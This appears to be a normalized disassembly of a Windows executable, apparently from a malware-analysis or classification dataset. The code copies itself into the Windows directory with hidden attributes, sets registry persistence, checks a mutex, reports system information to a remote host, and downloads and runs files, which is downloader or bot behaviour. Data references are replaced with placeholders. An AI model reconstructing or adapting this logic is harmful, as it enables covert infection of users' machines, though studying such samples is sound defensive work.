sub_401000
mov eax sub_405994
call _EH_prolog
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40106c
test eax eax
jne r-xdata
call sub_40231a
call [ WSACleanup@IAT ]
xor eax eax
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_40106c
push ecx
push ebx
push ebp
push esi
push edi
push rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov esi rw-data
push esi
call sub_401059
push rw-data
call sub_401059
mov ebp rw-data
push ebp
call sub_401059
push rw-data
call sub_401059
push rw-data
call sub_401059
push rw-data
call sub_401059
mov ebx rw-data
push ebx
call sub_401059
mov edi rw-data
push edi
call sub_401059
push rw-data
call sub_401047
push ebx
call sub_401047
push edi
call sub_401047
push rw-data
call sub_401059
push rw-data
call sub_401059
push rw-data
call sub_401059
push rw-data
call sub_401059
add esp 0x40
push rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
call sub_401059
mov [ esp ] rw-data
push rw-data
call strcpy
push rw-data
push rw-data
call strcpy
push rw-data
push rw-data
call strcpy
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push ebp
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
add esp 0x40
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
add esp 0x40
push rw-data
push edi
call strcat
push esi
mov esi rw-data
push esi
call strcpy
push rw-data
push esi
call strcat
mov esi [ CreateEventA@IAT ]
add esp 0x18
xor edi edi
push rw-data
push edi
push edi
push edi
call esi
push rw-data
push edi
push edi
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push rw-data
push edi
push edi
push edi
call esi
mov [ rw-data ] eax
call sub_4013c3
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push rw-data
call sub_40184f
call sub_40188d
neg eax
sbb eax eax
push edi
neg eax
mov [ rw-data ] eax
call sub_4013e2
call sub_401632
call sub_40265e
call sub_401f94
call sub_4020fd
call sub_4021d4
mov esi [ malloc@IAT ]
mov ebx 0x2000
push ebx
call esi
add esp 0xc
cmp eax edi
mov [ rw-data ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push ebx
call esi
cmp eax edi
pop ecx
mov [ rw-data ] eax
jne r-xdata
call sub_401539
lea eax [ esp + 0x10 ]
push eax
push edi
push edi
push sub_402aee
push edi
push edi
call [ CreateThread@IAT ]
push 0x1
pop eax
sub_4013a2
push esi
mov esi [ esp + 0x8 ]
push 0x0
push esi
call [ __import_lookup_table_0(KERNEL32:CreateDirectoryA) ]
push esi
call [ __import_lookup_table_0(KERNEL32:GetFileAttributesA) ]
or al 0x6
push eax
push esi
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
pop esi
retn
sub_4013e2
push ebp
mov ebp esp
sub esp 0x288
push ebx
push esi
xor ebx ebx
push edi
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000002
mov [ ebp - 0x8 ] 0x80
xor esi esi
call [ RegCreateKeyExA@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x288 ]
push 0x200
push eax
push ebx
call [ __import_lookup_table_0(KERNEL32:GetModuleFileNameA) ]
lea eax [ ebp - 0x288 ]
push 0x5c
push eax
call [ __import_lookup_table_3(MSVCRT:strrchr) ]
mov esi eax
inc esi
push esi
push rw-data
call strcpy
mov cl [ esi ]
add esp 0x10
cmp cl bl
mov [ ebp + 0x8 ] ebx
je r-xdata
mov al [ ebp - 0x88 ]
mov eax [ ebp + 0x8 ]
push [ ebp - 0x8 ]
mov [ ebp + eax - 0x88 ] bl
lea eax [ ebp - 0x88 ]
push eax
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
lea edi [ ebp - 0x88 ]
mov eax esi
sub edi esi
cmp [ ebp + 0x8 ] ebx
mov [ esi + rw-data ] bl
je r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ ebp + esi - 0x87 ]
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
pop edi
pop esi
pop ebx
je r-xdata
push ebx
call [ __import_lookup_table_3(MSVCRT:time) ]
push eax
call [ __import_lookup_table_3(MSVCRT:srand) ]
pop ecx
pop ecx
call [ __import_lookup_table_3(MSVCRT:rand) ]
push 0x4
push edi
push 0x4
push ebx
push esi
mov [ rw-data ] eax
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
inc cl
inc [ ebp + 0x8 ]
mov [ edi + eax ] cl
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edi rw-data
push eax
push edi
push ebx
mov esi rw-data
push ebx
push esi
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
cmp al bl
je r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_401539
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0x4
push eax
push 0x4
push rw-data
push rw-data
push 0x80000002
call sub_4056b1
add esp 0x18
leave
retn
sub_401562
push ebp
mov ebp esp
sub esp 0x204
push esi
lea eax [ ebp - 0x204 ]
push 0x200
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x201 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call strcat
add esp 0x20
xor esi esi
lea eax [ ebp - 0x4 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000001
call [ RegCreateKeyExA@IAT ]
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call [ __import_lookup_table_1(ADVAPI32:RegDeleteValueA) ]
lea eax [ ebp - 0x204 ]
push eax
call strlen
pop ecx
push eax
lea eax [ ebp - 0x204 ]
push eax
push 0x1
push esi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
jmp r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x4 ] esi
pop esi
je r-xdata
sub_401632
push ebp
mov ebp esp
sub esp 0x600
push ebx
push esi
mov esi rw-data
xor ebx ebx
push esi
push ebx
push 0x1f0001
call [ OpenMutexA@IAT ]
cmp eax ebx
jne r-xdata
push edi
push eax
call [ CloseHandle@IAT ]
mov edi rw-data
push rw-data
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
push esi
push ebx
push ebx
call [ __import_lookup_table_0(KERNEL32:CreateMutexA) ]
jmp r-xdata
push [ rw-data ]
call [ SetEvent@IAT ]
push 0x1388
push [ rw-data ]
call [ __import_lookup_table_0(KERNEL32:WaitForSingleObject) ]
push 0x1f4
call [ __import_lookup_table_0(KERNEL32:Sleep) ]
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x1fd ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x200 ]
push edi
push eax
call strcat
add esp 0x20
lea eax [ ebp - 0x200 ]
push ebx
push eax
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
lea eax [ ebp - 0x200 ]
push eax
call [ DeleteFileA@IAT ]
push ebx
push edi
call sub_401562
pop ecx
pop ecx
push esi
push ebx
push ebx
call [ __import_lookup_table_0(KERNEL32:CreateMutexA) ]
pop edi
push rw-data
push rw-data
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x600 ]
push 0x400
push eax
push ebx
call [ __import_lookup_table_0(KERNEL32:GetModuleFileNameA) ]
mov [ ebp + eax - 0x600 ] bl
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x1fd ]
push rw-data
push eax
call strcpy
pop ecx
lea eax [ ebp - 0x200 ]
pop ecx
push ebx
push eax
call [ __import_lookup_table_0(KERNEL32:CreateDirectoryA) ]
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x200 ]
push eax
call sub_4013a2
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
mov esi rw-data
lea eax [ ebp - 0x200 ]
push esi
push eax
call strcat
add esp 0x1c
lea eax [ ebp - 0x200 ]
push eax
lea eax [ ebp - 0x600 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
push 0x1
push esi
call sub_401562
push 0x1
call sub_4013e2
add esp 0xc
pop esi
pop ebx
leave
retn
call sub_402ec8
lea eax [ ebp - 0x200 ]
push ebx
push eax
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
lea eax [ ebp - 0x200 ]
push ebx
push eax
lea eax [ ebp - 0x600 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x200 ]
push eax
call sub_40457b
lea eax [ ebp - 0x200 ]
push eax
call sub_404ec3
pop ecx
pop ecx
push 0x1
call [ ExitProcess@IAT ]
push 0x1
call [ ExitProcess@IAT ]
sub_40184f
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi 0x9c
push edi
push 0x0
push esi
call memset
add esp 0xc
mov [ esi ] edi
mov edi [ __import_lookup_table_0(KERNEL32:GetVersionExA) ]
push esi
call edi
test eax eax
jne r-xdata
call [ GetSystemDefaultLangID@IAT ]
pop edi
mov [ rw-data ] ax
pop esi
retn
push esi
mov [ esi ] 0x94
call edi
sub_40188d
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
xor ebx ebx
push 0x1
push ebx
push rw-data
push 0x80000001
mov [ ebp - 0x8 ] 0x4
call [ __import_lookup_table_1(ADVAPI32:RegOpenKeyExA) ]
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x8 ]
mov esi [ RegQueryValueExA@IAT ]
push eax
push rw-data
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x100
call esi
push [ ebp - 0x4 ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp edi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ __import_lookup_table_3(MSVCRT:strstr) ]
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
lea edi [ ebp - 0x108 ]
add edi 0x5
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3a
push edi
call [ strchr@IAT ]
mov esi eax
push edi
push rw-data
mov [ esi ] bl
call strcpy
inc esi
push esi
call [ __import_lookup_table_3(MSVCRT:atoi) ]
add esp 0x14
mov [ rw-data ] eax
push 0x1
pop eax
jmp r-xdata
sub_401970
push ebp
mov ebp esp
mov eax 0x2128
call sub_4057b0
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_4026d1
mov edi [ inet_addr@IAT ]
pop ecx
push eax
call edi
xor ebx ebx
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
push ebx
push 0x1
push 0x2
mov [ ebp - 0x10 ] eax
call [ socket@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] 0x1
push eax
push 0x8004667e
push esi
call [ ioctlsocket@IAT ]
cmp [ rw-data ] ebx
mov [ ebp - 0x8 ] 0x3c
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x124 ] esi
mov [ ebp - 0x128 ] 0x1
je r-xdata
mov edi [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
push rw-data
call edi
mov edi eax
mov eax [ rw-data ]
jmp r-xdata
push esi
call [ closesocket@IAT ]
mov eax ebx
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2128 ]
push [ ebp + 0x24 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_402482
lea eax [ ebp - 0x2128 ]
push eax
call strlen
push [ ebp + 0x18 ]
mov edi eax
push [ ebp + 0x14 ]
lea eax [ ebp + edi - 0x2128 ]
push eax
call memcpy
mov eax [ ebp + 0x18 ]
add esp 0x28
add edi eax
lea eax [ ebp - 0x2128 ]
push ebx
push edi
push eax
push esi
call [ send@IAT ]
cmp [ ebp + 0x24 ] 0x1
jne r-xdata
push eax
mov [ ebp - 0x24 ] 0x2
call [ htons@IAT ]
mov [ ebp - 0x22 ] ax
lea eax [ ebp - 0x24 ]
push 0x10
push eax
push esi
mov [ ebp - 0x20 ] edi
call [ connect@IAT ]
lea ecx [ ebp - 0x8 ]
lea eax [ esi + 0x1 ]
push ecx
lea ecx [ ebp - 0x128 ]
push ebx
push ecx
push ebx
push eax
call [ select@IAT ]
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_402583
cmp eax 0xffffffff
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x128 ]
push ebx
push eax
lea eax [ esi + 0x1 ]
push ebx
push eax
call [ select@IAT ]
test eax eax
jle r-xdata
push esi
call [ closesocket@IAT ]
cmp eax 0x3e800
jge r-xdata
push 0x1
pop ebx
xor edi edi
mov eax 0x3e800
push ebx
sub eax edi
push eax
mov eax [ ebp + 0x1c ]
add eax edi
push eax
push esi
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp eax ebx
je r-xdata
push esi
call [ closesocket@IAT ]
mov eax [ ebp + 0x20 ]
push 0x1
mov [ eax ] edi
pop eax
jmp r-xdata
add edi eax
cmp edi 0x3e800
jl r-xdata
lea eax [ ebp - 0x8 ]
push eax
push ebx
lea eax [ ebp - 0x128 ]
push ebx
push eax
lea eax [ esi + 0x1 ]
push eax
call [ select@IAT ]
test eax eax
jle r-xdata
sub_401b39
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ esp + 0x8 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401970
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
mov eax [ esi ]
push 0x1
mov [ rw-data ] eax
pop edi
pop edi
pop esi
pop ecx
retn
sub_401b91
push ebp
mov ebp esp
sub esp 0x50c
push ebx
push esi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ __import_lookup_table_0(KERNEL32:GetProcAddress) ]
push esi
mov ebx eax
call [ __import_lookup_table_0(KERNEL32:FreeLibrary) ]
push 0x3e800
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ ebp - 0x4 ] eax
je r-xdata
pop esi
pop ebx
leave
retn
mov esi rw-data
push edi
lea eax [ ebp - 0x50c ]
push esi
push eax
call strcpy
push esi
call strlen
mov esi eax
mov edi rw-data
inc esi
push edi
lea eax [ ebp + esi - 0x50c ]
push eax
call strcpy
push edi
call strlen
lea esi [ esi + eax + 0x1 ]
mov edi 0x9c
push edi
push rw-data
lea eax [ ebp + esi - 0x50c ]
push eax
call memcpy
mov ax [ rw-data ]
add esi edi
mov edi rw-data
mov [ ebp + esi - 0x50c ] ax
inc esi
inc esi
cmp [ rw-data ] 0x0
push edi
setne al
mov [ ebp + esi - 0x50c ] al
mov eax [ rw-data ]
inc esi
mov [ ebp + esi - 0x50c ] eax
add esi 0x4
lea eax [ ebp + esi - 0x50c ]
push eax
call strcpy
push edi
call strlen
add esp 0x30
lea esi [ esi + eax + 0x1 ]
call ebx
mov ecx 0x36ee80
xor edx edx
mov ebx ecx
mov edi eax
div ebx
mov ebx 0xea60
mov eax edx
xor edx edx
div ebx
xor edx edx
push eax
mov eax edi
div ecx
push eax
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call [ __import_lookup_table_3(MSVCRT:sprintf) ]
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp + esi - 0x50c ]
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push eax
call strlen
lea esi [ esi + eax + 0x1 ]
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push 0x2f
push eax
call [ __import_lookup_table_3(MSVCRT:strrchr) ]
mov edi rw-data
lea ebx [ ebp + esi - 0x50c ]
push edi
push ebx
mov [ ebp - 0x8 ] eax
call strcpy
mov eax [ ebp - 0x8 ]
add esp 0x34
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push 0x1
push eax
lea eax [ ebp - 0x50c ]
push [ ebp - 0x4 ]
push esi
push eax
push rw-data
push 0x50
push [ rw-data ]
call [ inet_ntoa@IAT ]
push eax
call sub_401970
push [ ebp - 0x4 ]
mov esi eax
call [ free@IAT ]
add esp 0x24
mov eax esi
pop edi
and [ eax ] 0x0
lea eax [ ebp - 0x10c ]
push eax
push ebx
call strcat
push edi
call strlen
mov edi eax
lea eax [ ebp - 0x10c ]
push eax
call strlen
add esp 0x10
add eax esi
lea esi [ eax + edi + 0x2 ]
sub_401d7d
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401970
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
push [ ebp - 0x4 ]
push esi
call sub_401dda
pop ecx
mov edi eax
pop ecx
pop edi
pop esi
leave
retn
sub_401dda
push ebx
xor ebx ebx
cmp [ esp + 0xc ] ebx
push esi
push edi
jle r-xdata
xor eax eax
mov edi [ esp + 0x10 ]
mov esi rw-data
push esi
call strlen
pop ecx
add eax ebx
mov eax [ eax + edi + 0x1 ]
xor ecx ecx
cmp eax [ rw-data ]
sete cl
mov eax ecx
jmp r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + edi ]
push esi
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
sub_401e27
push ebx
push ebp
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ __import_lookup_table_0(KERNEL32:GetProcAddress) ]
push esi
mov ebp eax
call [ __import_lookup_table_0(KERNEL32:FreeLibrary) ]
mov edi [ esp + 0x18 ]
xor ebx ebx
lea esi [ edi + edi * 4 + 0x3a98 ]
shl esi 0x1
call ebp
xor ebp ebp
mov [ rw-data ] eax
cmp edi ebp
jle r-xdata
push 0x1
pop eax
cmp [ rw-data ] ebp
jne r-xdata
xor eax eax
jmp r-xdata
mov eax edi
push ebp
sub eax ebx
push eax
mov eax [ esp + 0x1c ]
add eax ebx
push eax
push [ rw-data ]
call [ send@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
add ebx eax
mov eax edi
sub eax ebx
add eax 0xbb8
lea esi [ eax + eax * 4 ]
shl esi 0x1
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
mov [ rw-data ] ebp
push 0x1
call [ __import_lookup_table_0(KERNEL32:Sleep) ]
mov eax esi
dec esi
test eax eax
je r-xdata
jmp r-xdata
cmp ebx edi
jl r-xdata
sub_401ed3
push ebp
mov ebp esp
sub esp 0x200
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ esi ] 0x41
je r-xdata
push 0x200
lea eax [ ebp - 0x200 ]
push ebx
push eax
call memset
add esp 0xc
push [ esi + 0x1 ]
push 0x1
push rw-data
push 0x51
push [ rw-data ]
call [ inet_ntoa@IAT ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_402482
lea eax [ ebp - 0x200 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_401e27
add esp 0x24
test eax eax
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push esi
call sub_401e27
pop ecx
pop ecx
xor eax eax
jmp r-xdata
push [ rw-data ]
mov [ rw-data ] 0x1
mov [ rw-data ] ebx
call [ closesocket@IAT ]
pop esi
pop ebx
leave
retn
call sub_4026f0
test eax eax
je r-xdata
push 0x1
call [ __import_lookup_table_0(KERNEL32:Sleep) ]
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
sub_401f94
push ecx
push edi
push 0x3e800
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
pop ecx
retn
push esi
lea eax [ esp + 0x8 ]
push 0x0
push eax
push edi
push 0x0
push rw-data
push rw-data
mov esi rw-data
push 0x50
push esi
call sub_401970
add esp 0x20
test eax eax
je r-xdata
push edi
call [ free@IAT ]
pop ecx
pop esi
push esi
push rw-data
call strcpy
pop ecx
pop ecx
sub_401fea
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push 0x3e800
call [ malloc@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
push esi
push edi
lea ecx [ ebp - 0x8 ]
push ebx
push ecx
push eax
mov edi rw-data
push ebx
push edi
push rw-data
mov esi rw-data
push 0x50
push esi
call sub_401970
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
pop edi
mov eax ebx
pop esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
push rw-data
push eax
mov [ ecx + eax ] bl
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push ebx
push eax
push [ ebp - 0x4 ]
push ebx
push edi
push rw-data
push 0x50
push esi
call sub_401970
add esp 0x20
test eax eax
je r-xdata
lea eax [ ebp - 0x40c ]
push 0x400
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x40c ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x40c ]
pop ecx
push ebx
push 0x2
push 0x2
push ebx
push ebx
push 0x40000000
push eax
call [ __import_lookup_table_0(KERNEL32:CreateFileA) ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push esi
call [ WriteFile@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x40c ]
push eax
call sub_404ec3
pop ecx
push 0x1
pop ebx
sub_4020fd
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
push esi
push eax
push ebx
push esi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401970
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x40c ]
push 0x400
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x40c ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x40c ]
pop ecx
push esi
push 0x2
push 0x2
push esi
push esi
push 0x40000000
push eax
call [ __import_lookup_table_0(KERNEL32:CreateFileA) ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
push ebx
jmp r-xdata
lea eax [ ebp - 0xc ]
push esi
push eax
push [ ebp - 0x8 ]
push ebx
push edi
call [ WriteFile@IAT ]
push edi
mov [ ebp - 0x4 ] eax
call [ CloseHandle@IAT ]
cmp [ ebp - 0x4 ] esi
push ebx
jne r-xdata
call [ free@IAT ]
pop ecx
call [ free@IAT ]
lea eax [ ebp - 0x40c ]
push eax
call sub_404ec3
pop ecx
pop ecx
push 0x1
pop eax
sub_4021d4
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor ebx ebx
cmp esi ebx
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
push ebx
push eax
push esi
push ebx
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401970
add esp 0x20
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x4 ]
lea edi [ esi - 0x2 ]
mov [ eax + esi ] bl
push esi
jmp r-xdata
cmp edi ebx
je r-xdata
call [ free@IAT ]
pop ecx
add edi 0x2
push 0xd
push edi
mov [ ebp - 0x8 ] edi
call [ strchr@IAT ]
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
push rw-data
push [ ebp - 0x8 ]
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
mov [ edi ] bl
lea eax [ ebp - 0x4 ]
push ebx
push eax
push esi
push ebx
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401970
add esp 0x20
test eax eax
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x40c ]
push 0x400
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x40c ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x40c ]
pop ecx
push ebx
push 0x2
push 0x2
push ebx
push ebx
push 0x40000000
push eax
call [ __import_lookup_table_0(KERNEL32:CreateFileA) ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
add eax esi
cmp edi eax
jae r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
push [ ebp - 0x4 ]
push esi
push edi
call [ WriteFile@IAT ]
push edi
mov [ ebp - 0x8 ] eax
call [ CloseHandle@IAT ]
cmp [ ebp - 0x8 ] ebx
push esi
jne r-xdata
call [ free@IAT ]
lea eax [ ebp - 0x40c ]
push eax
call sub_404ec3
pop ecx
pop ecx
push 0x1
pop eax
sub_40231a
push ebp
mov ebp esp
sub esp 0x408
push ebx
push esi
mov esi [ GetWindowsDirectoryA@IAT ]
mov ebx 0x400
push edi
lea eax [ ebp - 0x408 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x408 ]
push rw-data
push eax
call strcat
mov edi [ DeleteFileA@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x408 ]
push eax
call edi
lea eax [ ebp - 0x408 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x408 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x408 ]
pop ecx
push eax
call edi
lea eax [ ebp - 0x408 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x408 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x408 ]
pop ecx
push eax
call edi
mov esi [ __import_lookup_table_0(KERNEL32:Sleep) ]
push 0x1
mov ebx 0x2710
pop edi
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x32
call esi
call sub_401fea
test eax eax
jne r-xdata
push eax
call [ closesocket@IAT ]
pop edi
pop esi
pop ebx
leave
retn
call sub_401b39
test eax eax
je r-xdata
push ebx
call esi
jmp r-xdata
call sub_401b91
test eax eax
je r-xdata
mov eax [ rw-data ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
test eax eax
je r-xdata
call sub_401d7d
test eax eax
je r-xdata
call sub_4026f0
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push 0x8004667e
push [ rw-data ]
call [ ioctlsocket@IAT ]
lea eax [ ebp - 0x8 ]
and [ rw-data ] 0x0
push eax
xor eax eax
push eax
push eax
push sub_402b27
push eax
push eax
mov [ rw-data ] edi
call [ CreateThread@IAT ]
mov [ rw-data ] edi
cmp [ rw-data ] 0x0
je r-xdata
call sub_4028ac
push edi
call esi
jmp r-xdata
cmp [ rw-data ] 0x0
